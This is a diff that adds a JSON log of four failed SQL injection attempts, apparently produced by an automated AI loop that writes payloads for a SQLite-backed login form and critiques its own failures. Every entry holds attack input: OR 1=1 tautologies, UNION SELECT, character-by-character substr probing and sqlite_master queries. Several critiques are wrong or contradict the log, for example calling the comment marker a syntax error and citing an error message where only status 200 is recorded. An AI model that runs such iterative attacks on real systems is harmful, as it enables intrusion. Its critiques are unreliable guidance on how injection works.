@@ -1,0 +1,34 @@
+[
+    {
+        "attempt_number": 1,
+        "vuln_type": "sqli",
+        "payload": "Here's a new, high-bypass SQLite payload for sqli:\n\n`' OR 1=1 AND substr(UserName,1,1)='a' AND substr(UserName,2,1)='d' AND substr(UserName,3,1)='m' AND substr(UserName,4,1)='i' AND substr(UserName,5,1)='n' --`\n\nThis payload attempts to bypass the SQL injection detection by using a combination of the OR operator and the SUBSTR function to extract the first 6 characters of the 'UserName' field, which is likely to be 'admin'.",
+        "server_response_summary": "Status 200",
+        "gamma_critique": "The payload failed due to a syntax error caused by the presence of the double hyphen (`--`) at the end, which is likely being interpreted as a comment by the SQLite engine, disrupting the intended SQL query. Additionally, the payload's reliance on the 'UserName' field, which is not relevant to the login/ping form, further contributed to its failure.",
+        "outcome": "failed"
+    },
+    {
+        "attempt_number": 2,
+        "vuln_type": "sqli",
+        "payload": "Payload=`' UNION SELECT 'admin','password' --`",
+        "server_response_summary": "Status 200",
+        "gamma_critique": "The payload failed because the UNION SELECT statement is attempting to combine result sets with a different number of columns, which is not allowed in SQL. The error message indicates that the original query and the injected query do not have the same number of result columns, suggesting that the payload needs to be modified to match the column count of the original query.",
+        "outcome": "failed"
+    },
+    {
+        "attempt_number": 3,
+        "vuln_type": "sqli",
+        "payload": "Payload=`' OR 1=1 AND substr(UserName,1,1)='a' AND substr(UserName,2,1)='d' AND substr(UserName,3,1)='m' AND substr(UserName,4,1)='i' AND substr(UserName,5,1)='n' AND substr(UserName,6,1)='i' AND substr(UserName,7,1)='n' AND substr(UserName,8,1)=' ' AND substr(UserName,9,1)='a' AND substr(UserName,10,1)='d' AND substr(UserName,11,1)='m' AND substr(UserName,12,1)='i' AND substr(UserName,13,1)='n' --`",
+        "server_response_summary": "Status 200",
+        "gamma_critique": "The payload failed to breach the SQLi vulnerability because the 'OR 1=1' condition is not being utilized effectively due to the presence of subsequent 'AND' conditions that are being evaluated, resulting in a restrictive filter that prevents the injection from succeeding. This is likely due to the use of a restrictive filter that checks for a specific username pattern, making the 'OR 1=1' condition ineffective.",
+        "outcome": "failed"
+    },
+    {
+        "attempt_number": 4,
+        "vuln_type": "sqli",
+        "payload": "Payload=`' OR 1=1 AND (SELECT CASE WHEN (SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='users')>0 THEN 1 ELSE 4 END FROM users LIMIT 0,1) AND substr(UserName,1,1)='a' AND substr(UserName,2,1)='d' AND substr(UserName,3,1)='m' AND substr(UserName,4,1)='i' AND substr(UserName,5,1)='n' AND substr(UserName,6,1)='i' AND substr(UserName,7,1)='n' AND substr(UserName,8,1)=' ' AND substr(UserName,9,1)='a' AND substr(UserName,10,1)='d' AND substr(UserName,11,1)='m' AND substr(UserName,12,1)='i' AND substr(UserName,13,1)='n' --`",
+        "server_response_summary": "Status 200",
+        "gamma_critique": "The payload failed to breach the SQLi vulnerability due to the presence of a CASE statement that checks for the existence of a 'users' table in the database, which likely indicates that the database schema is being dynamically generated, making it difficult to exploit. Additionally, the use of SUBSTR function to extract individual characters from the 'username' field is likely being mitigated by a length or character validation check, preventing the payload from successfully injecting malicious SQL.",
+        "outcome": "failed"
+    }
+]
